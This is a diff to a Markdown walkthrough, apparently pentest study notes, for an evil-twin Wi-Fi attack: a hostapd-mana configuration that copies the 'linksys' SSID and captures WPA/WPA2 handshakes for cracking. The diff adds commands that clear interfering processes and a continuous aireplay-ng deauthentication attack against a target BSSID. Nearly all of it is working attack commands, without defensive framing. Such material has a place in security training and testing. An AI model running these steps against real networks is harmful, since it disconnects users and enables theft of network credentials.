@@ -2,6 +2,7 @@
 
 ```text
 sudo apt install hostapd-mana
+sudo apt-get install libssl-dev
 ```
 
 ```text
@@ -34,21 +35,33 @@ ssid=linksys
 channel=1
 hw_mode=g
 ieee80211n=1
-wpa=2
+wpa=3
 wpa_key_mgmt=WPA-PSK
 wpa_passphrase=ANYPASSWORD
 wpa_pairwise=TKIP CCMP
 rsn_pairwise=TKIP CCMP
 mana_wpaout=/home/<name>/linksys.hccapx
 ```
+We need to specify the band to 2.4 GHz by setting the hw_mode parameter to the letter "g". If the network was running on 5 GHz, we would set hw_mode to "a".
+
+We will set the wpa parameter to the integer "3" to enable both WPA and WPA2 (setting this parameter to "1" enables only WPA and setting the value to "2" enables only WPA2).
+
 
 #### Start Access Point
 ```text
-sudo ip link set wlan0 up	
+
+sudo rfkill unblock wifi
+sudo rfkill unblock all
+sudo airmon-ng check kill
+sudo ip link set dev wlan0 up
+sudo ifconfig wlan0 up
 sudo hostapd-mana linksys-mana.conf
 ```
 
-Wait for a capture of a WPA/2 handshake in output
+Wait for a capture of a WPA/2 handshake in output.
+
+##### De-Auth if needed
+sudo aireplay-ng -0 0 -a 11:22:33:44:55:66 wlan0mon
 
 
 #### Crack!
